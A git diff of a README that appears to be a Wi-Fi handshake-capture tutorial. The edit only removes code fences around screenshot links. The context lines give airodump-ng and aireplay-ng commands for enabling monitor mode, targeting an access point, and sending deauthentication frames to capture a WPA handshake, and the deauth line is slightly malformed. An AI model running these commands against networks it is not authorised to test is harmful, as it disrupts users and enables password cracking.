@@ -53,9 +53,9 @@ Run:
 iw dev
 ```
 
-```md
+
 ![Command output](screenshots/0-interface.png)
-```
+
 
 
 Note the interface name, for example `wlan0` or `wlp2s0`.
@@ -68,9 +68,9 @@ Run the executable script:
 sudo ./Enable_monitor_mode.sh
 ```
 
-```md
+
 ![Monitor mode enabled](screenshots/1-monitor-mode.png)
-```
+
 
 Expected behavior:
 
@@ -87,9 +87,9 @@ Run:
 sudo airodump-ng wlan0mon
 ```
 
-```md
+
 ![Scan output](screenshots/2-scan.png)
-```
+
 
 Look for target networks with:
 
@@ -107,9 +107,9 @@ sudo airodump-ng --bssid <BSSID> --channel <CHANNEL> -w capture wlan0mon
 ```
 
 
-```md
+
 ![Targeted Network scan output](screenshots/3-target-scan.png)
-```
+
 
 
 Replace `<BSSID>` with the access point MAC address and `<CHANNEL>` with the network channel.
@@ -122,9 +122,9 @@ In a second terminal, send deauthentication frames:
 sudo aireplay-ng --deauth 10 <Number of Deauth packets> -a <BSSID> -c <Connected Client BSSID> -D <Disable Access Point detection, optional> wlan0mon
 ```
 
-```md
+
 ![Deauth output and the related captured handshake](screenshots/4-deauth-and-captured-handshake.png)
-```
+
 
 
 This may trigger a connected client to reconnect and generate the WPA handshake.
